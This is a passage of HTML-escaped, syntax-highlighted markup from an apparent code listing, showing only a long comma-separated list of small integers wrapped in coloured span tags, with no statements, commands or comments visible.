style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;24&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;17&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;45&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;24&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;90&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;93&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;81&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;50&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;25&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;50&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;68&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;93&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;25&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;24&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;90&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;24&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;50&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;25&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;24&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;68&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;24&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;17&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;90&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;25&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;90&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;93&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;90&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;38&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;70&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;90&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;58&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;11&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;79&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;27&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;42&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;23&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;88&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;30&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;35&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;47&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;59&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;71&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;71&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;73&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;35&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;68&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;38&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;38&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;45&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;30&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;81&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;15&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;50&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;24&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;81&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;90&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;58&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;81&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;30&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;27&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;23&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;77&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;43&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;52&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;31&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;81&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;30&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;27&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;77&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;35&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;47&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;59&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;71&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;71&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;71&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;73&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: 